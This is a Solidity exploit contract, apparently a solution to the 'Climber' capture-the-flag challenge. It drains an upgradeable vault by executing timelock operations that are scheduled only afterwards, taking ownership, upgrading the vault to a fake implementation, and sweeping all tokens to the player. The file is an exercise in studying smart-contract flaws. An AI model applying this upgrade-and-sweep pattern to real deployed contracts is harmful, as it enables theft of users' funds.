// SPDX-License-Identifier: MIT
import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "hardhat/console.sol";

contract FakeClimberVault is ClimberVault {
    function sweepFunds(address token, address recipient) public {
        SafeTransferLib.safeTransfer(token, recipient, IERC20(token).balanceOf(address(this)));
    }
}

contract Exploit {
    ClimberTimelock public timelock;
    ClimberVault public vault;
    address player;
    IERC20 token;

    // schule payload
    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt;

    constructor(address _timelock, address _vault, address _player, address _token) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(_vault);
        player = _player;
        token = IERC20(_token);
    }

    function exploit() public {
        // Change it to the address of the deployed FakeClimberVault
        // Then, call sweepFunds to get all the funds from the vault
        assert(vault.owner() == address(this));
        vault.upgradeTo(address(new FakeClimberVault()));
        FakeClimberVault(address(vault)).sweepFunds(address(token), player);
        timelock.schedule(targets, values, dataElements, salt);
    }

    function register(address[] calldata _targets, uint256[] calldata _values, bytes[] calldata _dataElements, bytes32 _salt) public {
        targets = _targets;
        values = _values;
        for (uint256 i = 0; i < _dataElements.length; i++) {
            dataElements.push(_dataElements[i]);
        }
        salt = _salt;
    }
}